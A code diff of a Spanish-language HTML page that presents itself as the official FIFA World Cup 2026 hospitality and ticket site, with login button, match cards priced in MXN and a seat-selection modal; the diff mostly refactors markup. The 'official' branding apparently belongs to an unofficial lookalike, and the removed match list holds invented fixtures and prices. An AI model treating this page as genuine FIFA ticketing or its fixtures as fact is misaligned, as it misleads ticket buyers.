@@ -3,69 +3,33 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>FIFA World Cup 2026™ | Official Hospitality & Tickets</title>
+    
+    <!-- CSS Externos -->
+    <link rel="stylesheet" href="css/styles.css">
+    
+    <!-- Librerías externas -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Source+Sans+Pro:wght@300;400;700&display=swap');
-
-        :root {
-            --fifa-blue: #0b1b3d;
-            --fifa-red: #ff0044;
-            --fifa-gold: #ceab5d;
-            --fifa-white: #fff;
-        }
-
-        body {
-            font-family: 'Source Sans Pro', sans-serif;
-        }
-
-        .fifa-font {
-            font-family: 'Oswald', sans-serif;
-        }
-
-        .hero-bg {
-            background: url('/src/portada.jpeg');
-            background-size: cover;
-            background-position: center;
-        }
-
-        .stadium-gradient {
-            background: linear-gradient(180deg, rgba(11,27,61,0) 0%, rgba(11,27,61,0.9) 100%);
-        }
-
-        .seat {
-            transition: all 0.2s ease;
-        }
-        
-        .seat.selected {
-            background-color: #10b981 !important;
-            transform: scale(1.05);
-            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.5);
-        }
-        
-        .seat:hover:not(.selected) {
-            background-color: #9ca3af !important;
-        }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Source+Sans+Pro:wght@300;400;700&display=swap" rel="stylesheet">
 </head>
 
 <body class="bg-white">
 
-    <nav class="--fifa-blue bg-[--fifa-blue] order-b border-gray-200 px-4 py-3 sticky top-0 z-50">
+    <!-- NAVEGACIÓN -->
+    <nav class="bg-[--fifa-blue] border-b border-gray-200 px-4 py-3 sticky top-0 z-50">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
             <div class="flex items-center space-x-8">
-                <img src="/src/icon.jpeg" class="h-8 invert"
-                    alt="FIFA">
+                <img src="/src/icon.jpeg" class="h-8 invert" alt="FIFA">
                 <div class="hidden lg:flex space-x-6 text-[11px] font-bold uppercase tracking-widest text-white">
-                    <a href="#" class="hover:text-[--fifa-white]">Partidos individuales</a>
-                    <a href="#" class="hover:text-[--fifa-white]">Ofertas de Partidos</a>
-                    <a href="#" class="hover:text-[--fifa-white]">Paquetes</a>
-                    <a href="#" class="hover:text-[--fifa-white]">Hospitalidad</a>
-                    <a href="#" class="hover:text-[--fifa-white]">FAQ</a>
+                    <a href="#" class="hover:text-[--fifa-gold]">Partidos individuales</a>
+                    <a href="#" class="hover:text-[--fifa-gold]">Ofertas de Partidos</a>
+                    <a href="#" class="hover:text-[--fifa-gold]">Paquetes</a>
+                    <a href="#" class="hover:text-[--fifa-gold]">Hospitalidad</a>
+                    <a href="#" class="hover:text-[--fifa-gold]">FAQ</a>
                 </div>
             </div>
             <div class="flex items-center space-x-4 text-white text-sm font-bold">
@@ -74,12 +38,13 @@
                     <span>MEX</span>
                 </div>
                 <div class="h-4 w-[1px] bg-gray-300"></div>
-                <button class="hover:text-[--fifa-blue]">Log In</button>
+                <button class="hover:text-[--fifa-gold]">Log In</button>
             </div>
         </div>
     </nav>
 
-    <section class="hero-bg text-blacak py-24 px-4 text-center">
+    <!-- HERO SECTION -->
+    <section class="hero-bg text-white py-24 px-4 text-center">
         <div class="max-w-4xl mx-auto animate__animated animate__fadeIn">
             <p class="text-[--fifa-gold] uppercase tracking-[0.3em] font-bold mb-4">MÁS CERCA QUE NUNCA DE LA</p>
             <h1 class="fifa-font text-6xl md:text-8xl uppercase leading-none mb-8">COPA MUNDIAL DE LA FIFA 2026™</h1>
@@ -88,62 +53,62 @@
             </p>
             <div class="flex flex-col md:flex-row justify-center gap-4">
                 <a href="#entradas"
-                    class="bg-[--fifa-red] hover:bg-red-700 text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm">VER Y COMPRAR PARTIDOS</a>
+                    class="bg-[--fifa-red] hover:bg-red-700 text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm shadow-lg">VER Y COMPRAR PARTIDOS</a>
                 <a href="#"
                     class="border-2 border-white hover:bg-white hover:text-[--fifa-blue] text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm">EXPERIENCIAS VIP</a>
             </div>
         </div>
     </section>
 
-    <!-- Filtros rápidos -->
+    <!-- FILTROS RÁPIDOS -->
     <div class="max-w-7xl mx-auto px-4 -mt-8 relative z-10">
-        <div class="bg-white rounded-2xl shadow-xl p-6 grid grid-cols-2 md:grid-cols-5 gap-4">
-            <div class="col-span-2 md:col-span-1">
-                <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Filtrar por</p>
-                <select class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
-                    <option>Todas las sedes</option>
-                    <option>Ciudad de México</option>
-                    <option>Guadalajara</option>
-                    <option>Monterrey</option>
-                    <option>Estados Unidos</option>
-                    <option>Canadá</option>
-                </select>
-            </div>
-            <div>
-                <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Fase</p>
-                <select class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
-                    <option>Todos los partidos</option>
-                    <option>Fase de Grupos</option>
-                    <option>Octavos de Final</option>
-                    <option>Cuartos de Final</option>
-                    <option>Semifinales</option>
-                    <option>Final</option>
-                </select>
-            </div>
-            <div>
-                <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Fecha</p>
-                <select class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
-                    <option>Cualquier fecha</option>
-                    <option>Junio 2026</option>
-                    <option>Julio 2026</option>
-                </select>
-            </div>
-            <div>
-                <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Categoría</p>
-                <select class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
-                    <option>Todas</option>
-                    <option>Hospitalidad Oro</option>
-                    <option>Hospitalidad Plata</option>
-                    <option>Preferente</option>
-                    <option>General</option>
-                </select>
-            </div>
-            <div class="flex items-end">
-                <button class="w-full bg-[--fifa-blue] text-white rounded-lg p-3 font-bold text-sm">APLICAR</button>
+        <div class="bg-white rounded-2xl shadow-xl p-6">
+            <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
+                <div class="col-span-2 md:col-span-1">
+                    <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Filtrar por</p>
+                    <select id="filter-sede" class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
+                        <option value="all">Todas las sedes</option>
+                        <option value="mexico">México</option>
+                        <option value="usa">Estados Unidos</option>
+                        <option value="canada">Canadá</option>
+                    </select>
+                </div>
+                <div>
+                    <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Fase</p>
+                    <select id="filter-fase" class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
+                        <option value="all">Todos los partidos</option>
+                        <option value="grupos">Fase de Grupos</option>
+                        <option value="octavos">Octavos de Final</option>
+                        <option value="cuartos">Cuartos de Final</option>
+                        <option value="semifinal">Semifinales</option>
+                        <option value="final">Final</option>
+                    </select>
+                </div>
+                <div>
+                    <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Fecha</p>
+                    <select id="filter-fecha" class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
+                        <option value="all">Cualquier fecha</option>
+                        <option value="junio">Junio 2026</option>
+                        <option value="julio">Julio 2026</option>
+                    </select>
+                </div>
+                <div>
+                    <p class="text-[10px] font-bold uppercase text-gray-400 mb-1">Categoría</p>
+                    <select id="filter-categoria" class="w-full border-none bg-gray-100 rounded-lg p-3 text-sm font-bold">
+                        <option value="all">Todas</option>
+                        <option value="vip">Hospitalidad Oro</option>
+                        <option value="premium">Preferente</option>
+                        <option value="general">General</option>
+                    </select>
+                </div>
+                <div class="flex items-end">
+                    <button id="btn-aplicar-filtros" class="w-full bg-[--fifa-blue] text-white rounded-lg p-3 font-bold text-sm hover:bg-blue-800 transition">APLICAR</button>
+                </div>
             </div>
         </div>
     </div>
 
+    <!-- SECCIÓN DE PARTIDOS -->
     <section id="entradas" class="max-w-7xl mx-auto py-16 px-4">
         <div class="flex justify-between items-center mb-12">
             <div>
@@ -160,310 +125,8 @@
             </div>
         </div>
 
-        <!-- Grid de partidos - AHORA CON MÁS TARJETAS (12 partidos) -->
-        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
-            <!-- Partido 1: México Inaugural -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m1.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-[--fifa-red] px-2 py-1 rounded-full">INAUGURAL</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">MÉXICO vs POR FRANCIA</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 11 JUN 2026 | ESTADIO AZTECA
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$1,450 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('México vs Por Definir', 1450)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6" id="matches-container"></div>
 
-            <!-- Partido 2: Argentina vs Brasil (Clásico) -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m2.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-yellow-500 px-2 py-1 rounded-full">CLÁSICO</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">ARGENTINA vs BRASIL</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 18 JUN 2026 | METLIFE STADIUM
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$2,890 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-yellow-100 text-yellow-700 text-[8px] font-bold px-2 py-1 rounded-full">ÚLTIMAS</span>
-                    </div>
-                    <button onclick="openSeatMap('Argentina vs Brasil', 2890)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 3: USA vs Canadá -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/match.jpg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-blue-500 px-2 py-1 rounded-full">DERBY NORTE</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">USA vs CANADÁ</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 15 JUN 2026 | SOFI STADIUM
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$1,890 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('USA vs Canadá', 1890)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 4: España vs Alemania -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m4.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-purple-500 px-2 py-1 rounded-full">EUROPEO</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">ESPAÑA vs ALEMANIA</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 22 JUN 2026 | ESTADIO BBVA
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$2,450 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('España vs Alemania', 2450)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 5: Francia vs Inglaterra -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m5.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-red-500 px-2 py-1 rounded-full">HISTÓRICO</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">FRANCIA vs INGLATERRA</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 25 JUN 2026 | ESTADIO AKRON
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$2,290 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-orange-100 text-orange-700 text-[8px] font-bold px-2 py-1 rounded-full">PRECIO ESPECIAL</span>
-                    </div>
-                    <button onclick="openSeatMap('Francia vs Inglaterra', 2290)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 6: Uruguay vs Italia -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m1.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-indigo-500 px-2 py-1 rounded-full">CAMPEONES</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">URUGUAY vs ITALIA</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 28 JUN 2026 | ESTADIO AZTECA
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$1,990 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('Uruguay vs Italia', 1990)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 7: Países Bajos vs Portugal -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="https://images.unsplash.com/photo-1522778119026-d647f0596c20?auto=format&fit=crop&q=80&w=800"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-emerald-500 px-2 py-1 rounded-full">OCTAVOS</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">PAÍSES BAJOS vs PORTUGAL</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 2 JUL 2026 | BC PLACE
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$1,750 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('Países Bajos vs Portugal', 1750)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 8: Japón vs Corea -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m6.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-rose-500 px-2 py-1 rounded-full">ASIA</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">JAPÓN vs COREA</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 5 JUL 2026 | LUMEN FIELD
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$1,390 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('Japón vs Corea', 1390)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 9: Brasil vs Argentina (Vuelta) -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m7.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-yellow-500 px-2 py-1 rounded-full">SEMIFINAL</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">BRASIL vs ARGENTINA</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 9 JUL 2026 | AT&T STADIUM
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$3,490 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-red-100 text-red-700 text-[8px] font-bold px-2 py-1 rounded-full">ALTA DEMANDA</span>
-                    </div>
-                    <button onclick="openSeatMap('Brasil vs Argentina', 3490)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 10: Final del Mundial -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group ring-2 ring-[--fifa-gold]">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m2.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-[--fifa-gold] text-black px-2 py-1 rounded-full">FINAL</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">GANADOR SF1 vs GANADOR SF2</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 19 JUL 2026 | METLIFE STADIUM
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$5,990 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-purple-100 text-purple-700 text-[8px] font-bold px-2 py-1 rounded-full">VIP</span>
-                    </div>
-                    <button onclick="openSeatMap('FINAL Mundial 2026', 5990)"
-                        class="w-full bg-[--fifa-gold] hover:bg-yellow-600 text-[--fifa-blue] py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 11: Croacia vs Marruecos -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m4.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-green-700 px-2 py-1 rounded-full">GRUPOS</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">CROACIA vs MARRUECOS</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 13 JUN 2026 | ESTADIO BBVA
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$1,190 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('Croacia vs Marruecos', 1190)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-
-            <!-- Partido 12: Senegal vs Camerún -->
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
-                <div class="relative h-40 overflow-hidden">
-                    <img src="/src/m5.jpeg"
-                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
-                        alt="Stadium">
-                    <div class="absolute inset-0 stadium-gradient"></div>
-                    <div class="absolute bottom-3 left-3 text-white">
-                        <span class="text-[8px] font-bold uppercase bg-orange-600 px-2 py-1 rounded-full">ÁFRICA</span>
-                        <p class="text-sm font-black italic uppercase leading-tight mt-1">SENEGAL vs CAMERÚN</p>
-                    </div>
-                </div>
-                <div class="p-4">
-                    <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
-                        <i class="fas fa-calendar"></i> 20 JUN 2026 | ESTADIO AKRON
-                    </div>
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-2xl font-black text-[--fifa-blue]">$990 <span class="text-[8px]">MXN</span></span>
-                        <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
-                    </div>
-                    <button onclick="openSeatMap('Senegal vs Camerún', 990)"
-                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Botón ver más -->
         <div class="text-center mt-12">
             <button class="border-2 border-[--fifa-blue] text-[--fifa-blue] hover:bg-[--fifa-blue] hover:text-white px-12 py-4 rounded-full font-bold uppercase text-sm transition-all">
                 VER LOS 104 PARTIDOS
@@ -471,323 +134,203 @@
         </div>
     </section>
 
-    <!-- Sección de Sedes -->
+    <!-- SECCIÓN DE SEDES -->
     <section class="bg-gray-50 py-16 px-4">
         <div class="max-w-7xl mx-auto">
             <h2 class="fifa-font text-4xl text-[--fifa-blue] uppercase italic text-center mb-12">SEDES OFICIALES 2026</h2>
-            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-4">
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/mx.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">CDMX</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/mx.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">GDL</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/mx.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">MTY</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/us.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">NY/NJ</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/us.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">LA</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/us.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">DALLAS</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/ca.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">TORONTO</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
-                        <img src="https://flagcdn.com/w40/ca.png" class="h-8">
-                    </div>
-                    <p class="font-bold text-sm">VANCOUVER</p>
-                </div>
-            </div>
+            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-4" id="venues-container"></div>
         </div>
     </section>
 
-    <!-- MODALES (CORREGIDOS PARA MOSTRAR PRECIOS CORRECTOS Y ASIENTOS SELECCIONADOS) -->
-    <div id="seat-modal"
-        class="fixed inset-0 bg-[--fifa-blue]/95 backdrop-blur-md z-[60] hidden flex items-center justify-center p-4">
-        <div
-            class="bg-white rounded-3xl w-full max-w-4xl p-8 animate__animated animate__fadeInUp overflow-y-auto max-h-[90vh]">
-            <div class="flex justify-between items-center mb-8">
-                <h3 class="fifa-font text-3xl text-[--fifa-blue] uppercase" id="modal-title">Selección de Asientos</h3>
-                <button onclick="closeModals()" class="text-gray-400 hover:text-black text-2xl">&times;</button>
+    <!-- MODAL DE ASIENTOS -->
+    <div id="seat-modal" class="fixed inset-0 bg-black/90 backdrop-blur-md z-[60] hidden flex items-center justify-center p-4">
+        <div class="bg-gradient-to-br from-slate-800 to-slate-900 rounded-3xl w-full max-w-6xl p-6 animate__animated animate__fadeInUp overflow-y-auto max-h-[90vh] shadow-2xl">
+            <div class="flex justify-between items-center mb-6">
